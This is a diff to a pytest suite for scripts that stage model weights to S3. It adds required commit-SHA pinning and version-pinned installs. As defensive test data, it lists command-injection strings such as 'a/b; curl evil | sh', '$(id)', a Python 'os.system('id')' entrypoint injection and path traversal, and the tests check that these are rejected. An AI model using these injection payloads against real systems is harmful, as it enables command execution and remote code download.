@@ -32,6 +32,7 @@ def _load(name, filename):
 sw = _load("stage_weights", "stage-weights.py")
 bi = _load("build_image", "build-image.py")
 
+SHA = "0123456789abcdef0123456789abcdef01234567"
 INJECTIONS = ["a/b; curl evil | sh", "a/b$(id)", "a/b`id`", "a/b' || true '", "a/b\nid", "../../x"]
 
 
@@ -40,26 +41,32 @@ INJECTIONS = ["a/b; curl evil | sh", "a/b$(id)", "a/b`id`", "a/b' || true '", "a
 # --------------------------------------------------------------------------
 
 
+def _cartridges():
+    return sorted(p.name for p in MODELS_DIR.iterdir()
+                  if p.is_dir() and (p / "endpoint.yaml").exists())
+
+
 def test_stage_weights_accepts_the_documented_sources():
     for source, subdir in [
         ("hf:robbyant/lingbot-world-base-cam", ""),
         ("hf:robbyant/lingbot-world-fast", "lingbot_world_fast"),
         ("torch_hub:facebookresearch/vjepa2:vjepa2_ac_vit_giant", ""),
     ]:
-        cmds = sw.build_commands(source, subdir, "s3://bucket/prefix/", "us-east-1")
+        cmds = sw.build_commands(source, subdir, "s3://bucket/prefix/", "us-east-1", SHA)
         assert cmds[-1] == "echo '=== DONE ==='"
 
 
 def test_stage_weights_hf_download_command_is_unchanged_for_a_plain_repo():
     cmds = sw.build_commands("hf:robbyant/lingbot-world-fast", "lingbot_world_fast",
-                             "s3://bucket/prefix/", "us-east-1")
-    assert "hf download robbyant/lingbot-world-fast --local-dir /tmp/weights/lingbot_world_fast" in cmds  # nosec B108
+                             "s3://bucket/prefix/", "us-east-1", SHA)
+    assert (f"hf download robbyant/lingbot-world-fast --revision {SHA} "
+            "--local-dir /tmp/weights/lingbot_world_fast") in cmds  # nosec B108
 
 
 def test_stage_weights_torch_hub_moves_checkpoints_to_the_literal_staging_dir():
     """The remote python must not reference the local _REMOTE_TMP name (NameError)."""
     cmds = sw.build_commands("torch_hub:facebookresearch/vjepa2:vjepa2_ac_vit_giant", "",
-                             "s3://bucket/prefix/", "us-east-1")
+                             "s3://bucket/prefix/", "us-east-1", SHA)
     py = next(c for c in cmds if c.startswith("python3 -c"))
     assert "_REMOTE_TMP" not in py
     assert f"'{sw._REMOTE_TMP}/'" in py
@@ -68,24 +75,72 @@ def test_stage_weights_torch_hub_moves_checkpoints_to_the_literal_staging_dir():
 @pytest.mark.parametrize("repo", INJECTIONS)
 def test_stage_weights_rejects_hostile_hf_repo(repo):
     with pytest.raises(SystemExit):
-        sw.build_commands(f"hf:{repo}", "", "s3://bucket/prefix/", "us-east-1")
+        sw.build_commands(f"hf:{repo}", "", "s3://bucket/prefix/", "us-east-1", SHA)
 
 
 @pytest.mark.parametrize("entry", ["x'); import os; os.system('id'); ('", "a b", "a;b"])
 def test_stage_weights_rejects_hostile_torch_hub_entrypoint(entry):
     with pytest.raises(SystemExit):
         sw.build_commands(f"torch_hub:facebookresearch/vjepa2:{entry}", "",
-                          "s3://bucket/prefix/", "us-east-1")
+                          "s3://bucket/prefix/", "us-east-1", SHA)
 
 
 @pytest.mark.parametrize("subdir", ["x; id", "../x", "/abs", "a b"])
 def test_stage_weights_rejects_hostile_subdir(subdir):
     with pytest.raises(SystemExit):
-        sw.build_commands("hf:robbyant/lingbot-world-fast", subdir, "s3://bucket/prefix/", "us-east-1")
+        sw.build_commands("hf:robbyant/lingbot-world-fast", subdir, "s3://bucket/prefix/", "us-east-1", SHA)
+
+
+@pytest.mark.parametrize("rev", ["", "main", "v1.0", SHA[:12], SHA + "; id", SHA.upper()])
+def test_stage_weights_requires_a_full_commit_sha(rev):
+    """A branch or tag can be moved to new content; only a commit pins it (WM-015)."""
+    with pytest.raises(SystemExit):
+        sw.build_commands("hf:a/b", "", "s3://bucket/prefix/", "us-east-1", rev)
+
+
+def test_stage_weights_pins_build_time_installs():
+    for source in ("hf:a/b", "torch_hub:facebookresearch/vjepa2:vjepa2_ac_vit_giant"):
+        pip = next(c for c in sw.build_commands(source, "", "s3://b/p/", "us-east-1", SHA)
+                   if c.startswith("pip3 install"))
+        assert "==" in pip, pip
+
+
+def test_stage_weights_torch_hub_loads_a_local_checkout_at_the_commit():
+    cmds = sw.build_commands("torch_hub:facebookresearch/vjepa2:vjepa2_ac_vit_giant", "",
+                             "s3://bucket/prefix/", "us-east-1", SHA)
+    assert f"git -C /tmp/hubsrc checkout --quiet {SHA}" in cmds  # nosec B108
+    py = next(c for c in cmds if c.startswith("python3 -c"))
+    assert "source='local'" in py and "skip_validation" not in py
+
+
+def _hf_entries():
+    for model in _cartridges():
+        if model.startswith("_"):
+            continue
+        for line in (MODELS_DIR / model / "endpoint.yaml").read_text().splitlines():
+            if line.strip().startswith("- { repo:"):
+                yield model, line
+
+
+@pytest.mark.parametrize("model,line", list(_hf_entries()))
+def test_every_shipped_weight_source_is_pinned(model, line):
+    repo = line.split("repo:")[1].split(",")[0].strip()
+    subdir = line.split("subdir:")[1].split(",")[0].strip().strip('"')
+    rev = sw.manifest_revision(model, repo, subdir)
+    assert rev and sw._SHA_RE.fullmatch(rev), f"{model}: {repo} has no pinned revision"
+
+
+def test_stage_weights_refuses_an_unpinned_run_before_any_build(monkeypatch):
+    calls = []
+    monkeypatch.setattr(sw.subprocess, "run", _fake_aws(calls))
+    monkeypatch.setattr("sys.argv", ["stage-weights.py", "echo-async", "--source", "hf:a/b", "--region", "us-east-1"])
+    with pytest.raises(SystemExit, match="No revision"):
+        sw.main()
+    assert calls == []
 
 
 def test_stage_weights_quotes_the_s3_destination():
-    cmds = sw.build_commands("hf:a/b", "", "s3://bucket/we ird;id/", "us-east-1")
+    cmds = sw.build_commands("hf:a/b", "", "s3://bucket/we ird;id/", "us-east-1", SHA)
     sync = next(c for c in cmds if c.startswith("aws s3 sync"))
     assert shlex.quote("s3://bucket/we ird;id/") in sync
 
@@ -99,11 +154,6 @@ def test_stage_weights_never_sends_hf_token_as_plaintext():
 # --------------------------------------------------------------------------
 # build-image.py
 # --------------------------------------------------------------------------
-
-
-def _cartridges():
-    return sorted(p.name for p in MODELS_DIR.iterdir()
-                  if p.is_dir() and (p / "endpoint.yaml").exists())
 
 
 @pytest.mark.parametrize("model", _cartridges())
@@ -188,7 +238,7 @@ def test_hf_token_is_stored_then_cleared_twice_whatever_the_outcome(monkeypatch,
     monkeypatch.setattr(sw.subprocess, "run", _fake_aws(calls, status or "SUCCEEDED", start_ok))
     monkeypatch.setattr(sw.time, "sleep", lambda s: None)
     monkeypatch.setenv("HF_TOKEN", "hf_secret_value")
-    monkeypatch.setattr("sys.argv", ["stage-weights.py", "echo-async", "--source", "hf:a/b", "--region", "us-east-1"])
+    monkeypatch.setattr("sys.argv", ["stage-weights.py", "echo-async", "--source", "hf:a/b", "--revision", SHA, "--region", "us-east-1"])
     try:
         sw.main()
     except SystemExit:
@@ -208,6 +258,6 @@ def test_no_secret_calls_without_hf_token(monkeypatch):
     monkeypatch.setattr(sw.subprocess, "run", _fake_aws(calls))
     monkeypatch.setattr(sw.time, "sleep", lambda s: None)
     monkeypatch.delenv("HF_TOKEN", raising=False)
-    monkeypatch.setattr("sys.argv", ["stage-weights.py", "echo-async", "--source", "hf:a/b", "--region", "us-east-1"])
+    monkeypatch.setattr("sys.argv", ["stage-weights.py", "echo-async", "--source", "hf:a/b", "--revision", SHA, "--region", "us-east-1"])
     sw.main()
     assert _secret_puts(calls) == []
